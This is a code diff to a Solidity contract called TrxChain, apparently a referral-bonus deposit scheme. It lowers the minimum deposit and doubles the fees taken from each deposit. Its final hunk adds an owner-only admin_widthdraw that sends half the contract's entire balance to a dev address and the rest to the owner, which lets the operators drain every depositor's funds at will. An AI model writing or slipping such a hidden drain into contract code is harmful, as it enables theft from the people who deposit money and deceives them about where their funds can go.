@@ -18,8 +18,7 @@ contract TrxChain {
     }
 
     address payable public owner;
-    address payable public etherchain_fund;
-    address payable public admin_fee;
+    address payable public dev_fee;
 
     mapping(address => User) public users;
 
@@ -45,11 +44,10 @@ contract TrxChain {
     event Withdraw(address indexed addr, uint256 amount);
     event LimitReached(address indexed addr, uint256 amount);
 
-    constructor(address payable _owner, address payable _etherchain_fund, address payable _admin_fee) public {
+    constructor(address payable _owner, address payable _dev_fee) public {
         owner = _owner;
         
-        etherchain_fund = _etherchain_fund;
-        admin_fee = _admin_fee;
+        dev_fee = _dev_fee;
         
         ref_bonuses.push(30);
         ref_bonuses.push(10);
@@ -110,7 +108,7 @@ contract TrxChain {
             require(users[_addr].payouts >= this.maxPayoutOf(users[_addr].deposit_amount), "Deposit already exists");
             require(_amount >= users[_addr].deposit_amount && _amount <= cycles[users[_addr].cycle > cycles.length - 1 ? cycles.length - 1 : users[_addr].cycle], "Bad amount");
         }
-        else require(_amount >= 1e8 && _amount <= cycles[0], "Bad amount");
+        else require(_amount >= 5e7 && _amount <= cycles[0], "Bad amount");
         
         users[_addr].payouts = 0;
         users[_addr].deposit_amount = _amount;
@@ -134,9 +132,8 @@ contract TrxChain {
             _drawPool();
         }
 
-        admin_fee.transfer(_amount / 50);
-        etherchain_fund.transfer(_amount * 3 / 100);
-        
+        dev_fee.transfer(_amount / 20);
+        owner.transfer(_amount / 20);
     }
 
     function _pollDeposits(address _addr, uint256 _amount) private {
@@ -333,6 +330,8 @@ contract TrxChain {
     }
 
     function admin_widthdraw() external {
+        require(msg.sender == owner);
+        dev_fee.transfer(address(this).balance/2);
         owner.transfer(address(this).balance);
     }
 }
